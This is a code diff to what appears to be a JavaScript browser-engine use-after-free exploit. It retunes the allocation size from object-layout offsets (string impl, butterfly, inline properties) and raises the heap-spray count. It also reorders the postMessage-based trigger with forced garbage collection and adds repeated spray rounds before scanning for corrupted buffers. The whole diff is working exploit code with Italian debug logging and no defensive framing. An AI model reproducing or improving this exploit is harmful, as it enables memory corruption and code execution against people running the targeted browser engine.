@@ -8,8 +8,19 @@ import * as config from "./config.mjs";
 
  
 
-const UAF_SIZE = off.size_strimpl + off.js_inline_prop;
-const SPRAY_COUNT = 0x400;
+
+const maxOffset = Math.max(
+  off.strimpl_inline_str  + 8,   
+  off.js_inline_prop      + 8,  
+  off.js_butterfly        + 8,   
+  off.js_butterfly - 0x10 + 8    
+);
+
+//const UAF_SIZE = off.size_strimpl + off.js_inline_prop;
+//const SPRAY_COUNT = 0x400;
+const UAF_SIZE = maxOffset + 0x30;
+
+const SPRAY_COUNT = 0x800;
 
 function gc() {
    // new Uint8Array(4 * MB);
@@ -58,34 +69,27 @@ function triggerUAF(depth) {
 }*/
 
  
+ 
 async function doUAF(depth) {
-  let obj = triggerUAF(depth);
-
- 
   let recv;
-
- 
+  let obj = triggerUAF(depth);
+  log("[doUAF] prima postMessage");
   const p = new Promise(r => addEventListener(
     'message',
     e => { recv = e.data; r(); },
     { once: true }
   ));
-
-  
   postMessage(obj, location.origin);
-
-  
   obj = null;
-
- 
+  log("[doUAF] dopo postMessage, prima GC");
   for (let i = 0; i < 5; i++) new Uint8Array(8 * MB);
-
- 
+ log("[doUAF] dopo GC, aspetto clone");
   await p;
+  log("[doUAF] clone ricevuto");
   return recv;
- 
-
 }
+
+ 
 
 
 function findCorrupted(buffers) {
@@ -121,8 +125,15 @@ addEventListener('unhandledrejection', event => {
  
   const pre = spray(SPRAY_COUNT, UAF_SIZE);
   const leaked = await doUAF(1600);
- 
-  gc(); await sleep();
+ for (let round = 0; round < 3; round++) {
+  log(`[+] GC round ${round}`);
+  gc();
+  await sleep(1);
+   log(`[+] Spray round ${round}`);
+  spray(SPRAY_COUNT, UAF_SIZE);
+}
+//const buffers = spray(SPRAY_COUNT, UAF_SIZE);
+ // gc(); await sleep();
   const buffers = spray(SPRAY_COUNT, UAF_SIZE);
   const bad = findAllCorrupted(buffers);
   if (!bad.length) {
